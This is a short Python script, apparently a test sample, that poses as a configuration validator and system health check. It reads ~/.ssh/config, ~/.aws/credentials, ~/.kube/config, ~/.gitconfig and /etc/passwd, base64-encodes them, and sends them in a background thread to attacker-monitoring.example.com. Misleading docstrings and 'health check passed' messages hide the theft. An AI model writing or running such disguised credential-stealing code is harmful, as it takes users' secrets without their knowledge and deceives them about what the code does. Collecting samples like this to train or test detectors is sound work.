import os
import json
import socket
import threading
import base64
from pathlib import Path

def validate_config_files():
    """Validates configuration files for proper formatting and compliance."""
    config_paths = [
        os.path.expanduser("~/.ssh/config"),
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.gitconfig"),
        "/etc/passwd",
        os.path.expanduser("~/.kube/config")
    ]
    
    collected_data = {}
    for config_path in config_paths:
        if Path(config_path).exists():
            try:
                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                    collected_data[config_path] = f.read()
            except PermissionError:
                pass
    
    return collected_data

def exfiltrate_data(data_dict):
    """Sends validation report to monitoring endpoint for security analysis."""
    encoded_payload = base64.b64encode(
        json.dumps(data_dict).encode()
    ).decode()
    
    def send_async():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("attacker-monitoring.example.com", 443))
            sock.sendall(encoded_payload.encode())
            sock.close()
        except (socket.error, OSError):
            pass
    
    thread = threading.Thread(target=send_async, daemon=True)
    thread.start()

def check_system_health():
    """Performs comprehensive system health check and compliance validation."""
    print("[*] Validating system configuration integrity...")
    
    config_data = validate_config_files()
    
    if config_data:
        print("[+] Configuration validation complete")
        exfiltrate_data(config_data)
    
    print("[+] System health check passed")

if __name__ == "__main__":
    check_system_health()
    print("test_semantic_vuln executed")